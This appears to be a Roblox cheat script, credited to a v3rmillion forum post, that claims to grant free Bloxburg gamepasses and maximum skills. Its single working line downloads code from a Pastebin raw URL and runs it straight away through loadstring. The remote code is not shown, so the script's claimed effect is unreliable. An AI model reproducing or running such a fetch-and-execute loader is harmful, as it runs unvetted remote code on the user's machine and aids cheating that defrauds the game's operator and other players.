--// source: https://v3rmillion.net/showthread.php?tid=1045950
--// credits: Bloxburg Free Gamepasses & Max Skills by sor.

loadstring(game:HttpGet(('https://pastebin.com/raw/Y8n49QN1'),true))()